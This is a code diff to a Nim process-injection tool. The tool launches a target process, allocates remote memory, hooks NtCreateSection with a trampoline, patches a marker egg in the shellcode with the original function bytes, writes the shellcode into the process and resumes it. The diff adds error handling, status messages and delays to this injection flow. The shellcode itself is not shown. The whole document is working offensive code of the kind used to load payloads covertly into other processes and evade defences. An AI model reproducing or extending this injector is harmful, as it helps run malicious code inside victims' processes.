@@ -44,14 +44,9 @@ proc StartProcess(): void =
     tHandle = pi.hThread
 StartProcess()
 
-#echo "Waiting for debugger attaching"
-Sleep(1000)
-#var input = readLine(stdin)
-#echo GetLastError()
-echo "[*] Target Process: ", remoteProcID
+Sleep(2000)
 
-#let pHandle = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](remoteProcID))
-#echo GetLastError()
+echo "[*] Target Process: ", remoteProcID
 
 import dynlib
 
@@ -88,6 +83,15 @@ rPtr = VirtualAllocEx(
 )
 
 
+if(rPtr != nil):
+    echo "[+] Successfully allocated remote process memory for the shellcode"
+else:
+    echo "[-] Memory allocation for remote process failed!"
+    quit(1)
+
+echo "-------------------------------------------------------------------"
+Sleep(2000)
+
 var buffers: HookTrampolineBuffers
 
 var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
@@ -104,44 +108,56 @@ var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
 copyMem(PointerToOrigBytes, addressToHook, 24)
 
 echo "[*] Writing allocated Shellcode address ", repr(rPtr), " into Original NtCreateSection address as hook: "
-#echo "Other way hex : ", toHex(rPtr)
-#echo "Or repr: ", repr(rPtr)
 
 output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
-echo "[*] Remotely Hooked NtCreateSection: ", output
 
+if(output):
+    echo "[+] Remotely Hooked NtCreateSection: ", output
+else:
+    echo "[-] Remote Hook failed!"
+    quit(1)
+
+echo "-------------------------------------------------------------------"
+Sleep(2000)
 
 # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
 # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
 
+echo "[*] Searching for egg in the shellcode..."
+
 var eggIndex = 0
 for i in 0 ..< hookShellcodeBytes.len:
     if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
-        echo "[*] Found egg at index: ", i
+        echo "[+] Found egg at index: ", i
         eggIndex = i
         break
+
 # Write the original bytes into the egg
-echo "[*] Writing original bytes into egg"
+echo "[*] Modifying shellcode to add original NtCreateSection bytes"
 copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
 echo "[*] Done."
-# Finally write Shellcode into the remote process
 
+# Finally write the shellcode into the remote process
 var bytesWritten: SIZE_T
 let wSuccess = WriteProcessMemory(tProcess,rPtr,unsafeAddr hookShellcodeBytes[0],cast[SIZE_T](hookShellcodeBytes.len),addr bytesWritten)
 
-echo "[*] WriteProcessMemory: ", bool(wSuccess)
-echo "    \\-- bytes written: ", bytesWritten
-echo ""
-
+if(wSuccess):
+    echo "[+] WriteProcessMemory: ", bool(wSuccess)
+    echo "    \\-- bytes written: ", bytesWritten
+    echo ""
+else:
+    echo "[-] WriteProcessMemory failed!"
+    quit(1)
 
 ####################################################################
 
 
 # Time to resume the process
 
-Sleep(3000)
+echo "-------------------------------------------------------------------"
+Sleep(2000)
 
 echo "[*] Resuming the process"
 ResumeThread(tHandle)
 
-Sleep(1000)
+Sleep(4000)
